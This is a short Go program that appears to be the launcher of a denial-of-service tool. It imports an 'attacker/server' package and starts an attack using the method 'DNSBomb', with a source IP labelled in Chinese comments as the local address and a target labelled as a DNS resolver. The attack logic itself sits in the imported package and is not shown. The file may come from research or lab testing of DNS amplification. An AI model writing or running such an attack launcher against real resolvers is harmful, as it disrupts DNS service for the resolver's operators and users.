package main

import (
	"auth/attacker/server"
)

func main() {
	attack := server.Server{
		Method:         "DNSBomb",
		SrcIP:           "10.151.0.71", // 本地IP地址
		DstIP:           "10.152.0.71",     // DNS解析器IP地址
	}
	attack.Start()
}
